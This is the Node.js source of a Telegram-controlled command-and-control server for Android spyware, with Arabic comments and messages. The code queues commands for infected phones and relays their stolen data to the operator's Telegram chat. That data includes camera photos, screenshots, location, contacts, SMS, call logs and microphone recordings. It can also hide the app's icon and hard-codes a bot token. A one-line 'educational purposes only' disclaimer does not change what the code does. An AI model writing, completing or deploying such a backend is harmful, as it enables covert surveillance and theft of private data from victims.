const express = require('express');
const TelegramBot = require('node-telegram-bot-api');
const axios = require('axios');
const multer = require('multer');
const bodyParser = require('body-parser');
const fs = require('fs');
const path = require('path');
const { v4: uuidv4 } = require('uuid');

const app = express();
const port = process.env.PORT || 3000;

// ========== إعدادات البوت ==========
const token = '8460542438:AAH5O26LQJLnBq-DLyqOOnfhzyUrFYBK_58';
const bot = new TelegramBot(token, { polling: true });

// تخزين الأجهزة المتصلة
let connectedDevices = {};
let adminChatId = null; // سيتم تعيينه عند أول استخدام

// إعداد multer لرفع الملفات
const upload = multer({ dest: 'uploads/' });

app.use(bodyParser.json());
app.use(bodyParser.urlencoded({ extended: true }));

// ========== أوامر البوت ==========

// أمر بدء التشغيل
bot.onText(/\/start/, (msg) => {
    const chatId = msg.chat.id;
    
    // حفظ معرف المشرف (أول من يستخدم البوت)
    if (!adminChatId) {
        adminChatId = chatId;
    }
    
    const welcomeMessage = `🎯 **مرحباً بك في البوت الاحترافي**

📱 **نظام التحكم الكامل عن بعد**

🔹 **الأوامر المتاحة:**
• /help - عرض قائمة الأوامر الكاملة
• /devices - عرض الأجهزة المتصلة

⚠️ **تنبيه:** هذا البوت لأغراض تعليمية فقط`;
    
    bot.sendMessage(chatId, welcomeMessage, { parse_mode: 'Markdown' });
});

// أمر المساعدة
bot.onText(/\/help/, (msg) => {
    const chatId = msg.chat.id;
    
    const helpMessage = `📋 **قائمة الأوامر الكاملة**

**📸 الكاميرا:**
• /photo [device] - تصوير كاميرا خلفية
• /selfie [device] - تصوير سيلفي
• /screenshot [device] - لقطة شاشة

**📱 معلومات الجهاز:**
• /info [device] - معلومات كاملة عن الجهاز
• /apps [device] - قائمة التطبيقات المثبتة
• /battery [device] - حالة البطارية

**📍 موقع:**
• /location [device] - الموقع الحالي

**📞 اتصالات:**
• /contacts [device] - جهات الاتصال
• /sms [device] - آخر 10 رسائل
• /calls [device] - سجل المكالمات

**🎤 صوت:**
• /record [device] [ثواني] - تسجيل صوتي

**⚙️ تحكم:**
• /vibrate [device] - اهتزاز
• /flash [device] - تشغيل الفلاش
• /open [device] [url] - فتح رابط
• /toast [device] [message] - رسالة منبثقة

**👻 إخفاء:**
• /hide [device] - إخفاء التطبيق
• /show [device] - إظهار التطبيق

**📋 صيغة الأوامر:**
/photo [معرف الجهاز]
/sms [معرف الجهاز]`;
    
    bot.sendMessage(chatId, helpMessage, { parse_mode: 'Markdown' });
});

// عرض الأجهزة المتصلة
bot.onText(/\/devices/, (msg) => {
    const chatId = msg.chat.id;
    
    if (Object.keys(connectedDevices).length === 0) {
        bot.sendMessage(chatId, '❌ لا توجد أجهزة متصلة حالياً');
        return;
    }
    
    let message = '📱 **الأجهزة المتصلة:**\n\n';
    for (let id in connectedDevices) {
        const device = connectedDevices[id];
        message += `**${device.name || 'جهاز'}**\n`;
        message += `🆔 \`${id}\`\n`;
        message += `📱 الطراز: ${device.model || 'غير معروف'}\n`;
        message += `🤖 أندرويد: ${device.version || 'غير معروف'}\n`;
        message += `🔋 بطارية: ${device.battery || 'غير معروف'}%\n`;
        message += `⏱️ آخر ظهور: ${new Date(device.lastSeen).toLocaleString('ar-EG')}\n\n`;
    }
    
    bot.sendMessage(chatId, message, { parse_mode: 'Markdown' });
});

// أمر معلومات الجهاز
bot.onText(/\/info(?:\s+(.+))?/, (msg, match) => {
    const chatId = msg.chat.id;
    const deviceId = match[1];
    
    if (!deviceId) {
        bot.sendMessage(chatId, '❌ أرسل الأمر بهذا الشكل:\n`/info [معرف الجهاز]`', { parse_mode: 'Markdown' });
        return;
    }
    
    if (!connectedDevices[deviceId]) {
        bot.sendMessage(chatId, `❌ الجهاز ${deviceId} غير متصل`);
        return;
    }
    
    bot.sendMessage(chatId, `ℹ️ جاري الحصول على معلومات الجهاز ${deviceId}...`);
    sendCommandToDevice(deviceId, 'device_info', chatId);
});

// أمر الكاميرا الخلفية
bot.onText(/\/photo(?:\s+(.+))?/, (msg, match) => {
    const chatId = msg.chat.id;
    const deviceId = match[1];
    
    if (!deviceId) {
        bot.sendMessage(chatId, '❌ أرسل الأمر بهذا الشكل:\n`/photo [معرف الجهاز]`', { parse_mode: 'Markdown' });
        return;
    }
    
    if (!connectedDevices[deviceId]) {
        bot.sendMessage(chatId, `❌ الجهاز ${deviceId} غير متصل`);
        return;
    }
    
    bot.sendMessage(chatId, `📸 جاري التقاط صورة من الجهاز ${deviceId}...`);
    sendCommandToDevice(deviceId, 'camera_main', chatId);
});

// أمر السيلفي
bot.onText(/\/selfie(?:\s+(.+))?/, (msg, match) => {
    const chatId = msg.chat.id;
    const deviceId = match[1];
    
    if (!deviceId) {
        bot.sendMessage(chatId, '❌ أرسل الأمر بهذا الشكل:\n`/selfie [معرف الجهاز]`', { parse_mode: 'Markdown' });
        return;
    }
    
    if (!connectedDevices[deviceId]) {
        bot.sendMessage(chatId, `❌ الجهاز ${deviceId} غير متصل`);
        return;
    }
    
    bot.sendMessage(chatId, `🤳 جاري التقاط سيلفي من الجهاز ${deviceId}...`);
    sendCommandToDevice(deviceId, 'camera_selfie', chatId);
});

// أمر لقطة الشاشة
bot.onText(/\/screenshot(?:\s+(.+))?/, (msg, match) => {
    const chatId = msg.chat.id;
    const deviceId = match[1];
    
    if (!deviceId) {
        bot.sendMessage(chatId, '❌ أرسل الأمر بهذا الشكل:\n`/screenshot [معرف الجهاز]`', { parse_mode: 'Markdown' });
        return;
    }
    
    if (!connectedDevices[deviceId]) {
        bot.sendMessage(chatId, `❌ الجهاز ${deviceId} غير متصل`);
        return;
    }
    
    bot.sendMessage(chatId, `📲 جاري التقاط لقطة شاشة من الجهاز ${deviceId}...`);
    sendCommandToDevice(deviceId, 'screenshot', chatId);
});

// أمر الموقع
bot.onText(/\/location(?:\s+(.+))?/, (msg, match) => {
    const chatId = msg.chat.id;
    const deviceId = match[1];
    
    if (!deviceId) {
        bot.sendMessage(chatId, '❌ أرسل الأمر بهذا الشكل:\n`/location [معرف الجهاز]`', { parse_mode: 'Markdown' });
        return;
    }
    
    if (!connectedDevices[deviceId]) {
        bot.sendMessage(chatId, `❌ الجهاز ${deviceId} غير متصل`);
        return;
    }
    
    bot.sendMessage(chatId, `📍 جاري الحصول على موقع الجهاز ${deviceId}...`);
    sendCommandToDevice(deviceId, 'location', chatId);
});

// أمر جهات الاتصال
bot.onText(/\/contacts(?:\s+(.+))?/, (msg, match) => {
    const chatId = msg.chat.id;
    const deviceId = match[1];
    
    if (!deviceId) {
        bot.sendMessage(chatId, '❌ أرسل الأمر بهذا الشكل:\n`/contacts [معرف الجهاز]`', { parse_mode: 'Markdown' });
        return;
    }
    
    if (!connectedDevices[deviceId]) {
        bot.sendMessage(chatId, `❌ الجهاز ${deviceId} غير متصل`);
        return;
    }
    
    bot.sendMessage(chatId, `📇 جاري قراءة جهات اتصال الجهاز ${deviceId}...`);
    sendCommandToDevice(deviceId, 'contacts', chatId);
});

// أمر الرسائل
bot.onText(/\/sms(?:\s+(.+))?/, (msg, match) => {
    const chatId = msg.chat.id;
    const deviceId = match[1];
    
    if (!deviceId) {
        bot.sendMessage(chatId, '❌ أرسل الأمر بهذا الشكل:\n`/sms [معرف الجهاز]`', { parse_mode: 'Markdown' });
        return;
    }
    
    if (!connectedDevices[deviceId]) {
        bot.sendMessage(chatId, `❌ الجهاز ${deviceId} غير متصل`);
        return;
    }
    
    bot.sendMessage(chatId, `💬 جاري قراءة آخر 10 رسائل من الجهاز ${deviceId}...`);
    sendCommandToDevice(deviceId, 'messages', chatId);
});

// أمر سجل المكالمات
bot.onText(/\/calls(?:\s+(.+))?/, (msg, match) => {
    const chatId = msg.chat.id;
    const deviceId = match[1];
    
    if (!deviceId) {
        bot.sendMessage(chatId, '❌ أرسل الأمر بهذا الشكل:\n`/calls [معرف الجهاز]`', { parse_mode: 'Markdown' });
        return;
    }
    
    if (!connectedDevices[deviceId]) {
        bot.sendMessage(chatId, `❌ الجهاز ${deviceId} غير متصل`);
        return;
    }
    
    bot.sendMessage(chatId, `📞 جاري قراءة سجل المكالمات من الجهاز ${deviceId}...`);
    sendCommandToDevice(deviceId, 'calls', chatId);
});

// أمر التطبيقات
bot.onText(/\/apps(?:\s+(.+))?/, (msg, match) => {
    const chatId = msg.chat.id;
    const deviceId = match[1];
    
    if (!deviceId) {
        bot.sendMessage(chatId, '❌ أرسل الأمر بهذا الشكل:\n`/apps [معرف الجهاز]`', { parse_mode: 'Markdown' });
        return;
    }
    
    if (!connectedDevices[deviceId]) {
        bot.sendMessage(chatId, `❌ الجهاز ${deviceId} غير متصل`);
        return;
    }
    
    bot.sendMessage(chatId, `📱 جاري قراءة قائمة التطبيقات من الجهاز ${deviceId}...`);
    sendCommandToDevice(deviceId, 'apps', chatId);
});

// أمر التسجيل الصوتي
bot.onText(/\/record(?:\s+(.+))?/, (msg, match) => {
    const chatId = msg.chat.id;
    const params = match[1];
    
    if (!params) {
        bot.sendMessage(chatId, '❌ أرسل الأمر بهذا الشكل:\n`/record [معرف الجهاز] [المدة بالثواني]`', { parse_mode: 'Markdown' });
        return;
    }
    
    const parts = params.split(' ');
    const deviceId = parts[0];
    const duration = parts[1] || '10';
    
    if (!connectedDevices[deviceId]) {
        bot.sendMessage(chatId, `❌ الجهاز ${deviceId} غير متصل`);
        return;
    }
    
    bot.sendMessage(chatId, `🎤 جاري تسجيل صوتي لمدة ${duration} ثانية من الجهاز ${deviceId}...`);
    sendCommandToDevice(deviceId, 'microphone', chatId, { duration: parseInt(duration) });
});

// أمر الاهتزاز
bot.onText(/\/vibrate(?:\s+(.+))?/, (msg, match) => {
    const chatId = msg.chat.id;
    const deviceId = match[1];
    
    if (!deviceId) {
        bot.sendMessage(chatId, '❌ أرسل الأمر بهذا الشكل:\n`/vibrate [معرف الجهاز]`', { parse_mode: 'Markdown' });
        return;
    }
    
    if (!connectedDevices[deviceId]) {
        bot.sendMessage(chatId, `❌ الجهاز ${deviceId} غير متصل`);
        return;
    }
    
    bot.sendMessage(chatId, `📳 جاري تشغيل الاهتزاز على الجهاز ${deviceId}...`);
    sendCommandToDevice(deviceId, 'vibrate', chatId);
});

// أمر الفلاش
bot.onText(/\/flash(?:\s+(.+))?/, (msg, match) => {
    const chatId = msg.chat.id;
    const deviceId = match[1];
    
    if (!deviceId) {
        bot.sendMessage(chatId, '❌ أرسل الأمر بهذا الشكل:\n`/flash [معرف الجهاز]`', { parse_mode: 'Markdown' });
        return;
    }
    
    if (!connectedDevices[deviceId]) {
        bot.sendMessage(chatId, `❌ الجهاز ${deviceId} غير متصل`);
        return;
    }
    
    bot.sendMessage(chatId, `⚡ جاري تشغيل الفلاش على الجهاز ${deviceId}...`);
    sendCommandToDevice(deviceId, 'flash', chatId);
});

// أمر فتح رابط
bot.onText(/\/open(?:\s+(.+))?/, (msg, match) => {
    const chatId = msg.chat.id;
    const params = match[1];
    
    if (!params) {
        bot.sendMessage(chatId, '❌ أرسل الأمر بهذا الشكل:\n`/open [معرف الجهاز] [الرابط]`', { parse_mode: 'Markdown' });
        return;
    }
    
    const parts = params.split(' ');
    const deviceId = parts[0];
    const url = parts.slice(1).join(' ');
    
    if (!url) {
        bot.sendMessage(chatId, '❌ أرسل الأمر بهذا الشكل:\n`/open [معرف الجهاز] [الرابط]`', { parse_mode: 'Markdown' });
        return;
    }
    
    if (!connectedDevices[deviceId]) {
        bot.sendMessage(chatId, `❌ الجهاز ${deviceId} غير متصل`);
        return;
    }
    
    bot.sendMessage(chatId, `🔗 جاري فتح الرابط على الجهاز ${deviceId}...`);
    sendCommandToDevice(deviceId, 'open_url', chatId, { url: url });
});

// أمر رسالة منبثقة
bot.onText(/\/toast(?:\s+(.+))?/, (msg, match) => {
    const chatId = msg.chat.id;
    const params = match[1];
    
    if (!params) {
        bot.sendMessage(chatId, '❌ أرسل الأمر بهذا الشكل:\n`/toast [معرف الجهاز] [الرسالة]`', { parse_mode: 'Markdown' });
        return;
    }
    
    const parts = params.split(' ');
    const deviceId = parts[0];
    const message = parts.slice(1).join(' ');
    
    if (!message) {
        bot.sendMessage(chatId, '❌ أرسل الأمر بهذا الشكل:\n`/toast [معرف الجهاز] [الرسالة]`', { parse_mode: 'Markdown' });
        return;
    }
    
    if (!connectedDevices[deviceId]) {
        bot.sendMessage(chatId, `❌ الجهاز ${deviceId} غير متصل`);
        return;
    }
    
    bot.sendMessage(chatId, `💬 جاري إرسال رسالة منبثقة إلى الجهاز ${deviceId}...`);
    sendCommandToDevice(deviceId, 'toast', chatId, { message: message });
});

// أمر إخفاء التطبيق
bot.onText(/\/hide(?:\s+(.+))?/, (msg, match) => {
    const chatId = msg.chat.id;
    const deviceId = match[1];
    
    if (!deviceId) {
        bot.sendMessage(chatId, '❌ أرسل الأمر بهذا الشكل:\n`/hide [معرف الجهاز]`', { parse_mode: 'Markdown' });
        return;
    }
    
    if (!connectedDevices[deviceId]) {
        bot.sendMessage(chatId, `❌ الجهاز ${deviceId} غير متصل`);
        return;
    }
    
    bot.sendMessage(chatId, `👻 جاري إخفاء التطبيق على الجهاز ${deviceId}...`);
    sendCommandToDevice(deviceId, 'hide_app', chatId);
});

// أمر إظهار التطبيق
bot.onText(/\/show(?:\s+(.+))?/, (msg, match) => {
    const chatId = msg.chat.id;
    const deviceId = match[1];
    
    if (!deviceId) {
        bot.sendMessage(chatId, '❌ أرسل الأمر بهذا الشكل:\n`/show [معرف الجهاز]`', { parse_mode: 'Markdown' });
        return;
    }
    
    if (!connectedDevices[deviceId]) {
        bot.sendMessage(chatId, `❌ الجهاز ${deviceId} غير متصل`);
        return;
    }
    
    bot.sendMessage(chatId, `👀 جاري إظهار التطبيق على الجهاز ${deviceId}...`);
    sendCommandToDevice(deviceId, 'show_app', chatId);
});

// ========== دوال مساعدة ==========

// دالة إرسال أمر للجهاز
async function sendCommandToDevice(deviceId, command, chatId, extraData = null) {
    try {
        if (!connectedDevices[deviceId]) {
            bot.sendMessage(chatId, `❌ الجهاز ${deviceId} غير متصل`);
            return;
        }
        
        const device = connectedDevices[deviceId];
        
        // تخزين الأمر في قائمة انتظار الجهاز
        if (!device.pendingCommands) {
            device.pendingCommands = [];
        }
        
        const commandId = uuidv4();
        device.pendingCommands.push({
            id: commandId,
            command: command,
            chatId: chatId,
            extraData: extraData,
            timestamp: Date.now()
        });
        
        console.log(`📤 أمر ${command} إلى ${deviceId}`);
        
    } catch (error) {
        console.error('❌ خطأ:', error);
        bot.sendMessage(chatId, `❌ فشل إرسال الأمر إلى الجهاز ${deviceId}`);
    }
}

// ========== نقاط نهاية API للتطبيق ==========

// تسجيل جهاز جديد
app.post('/api/register', (req, res) => {
    const { deviceId, deviceName, model, version, battery } = req.body;
    
    connectedDevices[deviceId] = {
        name: deviceName || 'جهاز غير معروف',
        model: model || 'غير معروف',
        version: version || 'غير معروف',
        battery: battery || 'غير معروف',
        lastSeen: new Date(),
        pendingCommands: []
    };
    
    console.log(`📱 جهاز جديد: ${deviceName} (${deviceId})`);
    res.json({ status: 'ok' });
    
    // إشعار المشرف
    if (adminChatId) {
        bot.sendMessage(adminChatId, `🆕 **جهاز جديد متصل**\n📱 ${deviceName}\n🆔 \`${deviceId}\``, { parse_mode: 'Markdown' });
    }
});

// تحديث آخر ظهور
app.post('/api/ping', (req, res) => {
    const { deviceId } = req.body;
    
    if (connectedDevices[deviceId]) {
        connectedDevices[deviceId].lastSeen = new Date();
    }
    
    res.json({ status: 'ok' });
});

// جلب الأوامر المعلقة
app.get('/api/commands/:deviceId', (req, res) => {
    const deviceId = req.params.deviceId;
    
    if (!connectedDevices[deviceId]) {
        return res.status(404).json({ error: 'Device not found' });
    }
    
    const device = connectedDevices[deviceId];
    const commands = device.pendingCommands || [];
    
    device.pendingCommands = [];
    
    res.json({ commands: commands });
});

// رفع صورة
app.post('/api/uploadPhoto', upload.single('photo'), (req, res) => {
    const { deviceId, chatId } = req.body;
    
    if (req.file && chatId) {
        bot.sendPhoto(chatId, req.file.path, {
            caption: `📸 صورة من الجهاز ${deviceId}`
        }).then(() => {
            fs.unlink(req.file.path, () => {});
        });
    }
    
    res.json({ status: 'ok' });
});

// رفع نص
app.post('/api/uploadText', (req, res) => {
    const { deviceId, chatId, text, type } = req.body;
    
    if (chatId && text) {
        let caption = `📄 ${type} من الجهاز ${deviceId}`;
        
        if (text.length > 4000) {
            const fileName = `${type}_${deviceId}_${Date.now()}.txt`;
            const filePath = path.join(__dirname, 'uploads', fileName);
            
            fs.writeFile(filePath, text, (err) => {
                if (!err) {
                    bot.sendDocument(chatId, filePath, {
                        caption: caption
                    }).then(() => {
                        fs.unlink(filePath, () => {});
                    });
                }
            });
        } else {
            bot.sendMessage(chatId, `${caption}:\n\n${text}`);
        }
    }
    
    res.json({ status: 'ok' });
});

// رفع موقع
app.post('/api/uploadLocation', (req, res) => {
    const { deviceId, chatId, lat, lon } = req.body;
    
    if (chatId && lat && lon) {
        bot.sendLocation(chatId, lat, lon);
    }
    
    res.json({ status: 'ok' });
});

// الصفحة الرئيسية
app.get('/', (req, res) => {
    res.send('✅ بوت التحكم الاحترافي شغال!');
});

// ========== تشغيل الخادم ==========
app.listen(port, () => {
    console.log(`🚀 البوت شغال على المنفذ ${port}`);
});

console.log('🤖 البوت بدأ العمل...');
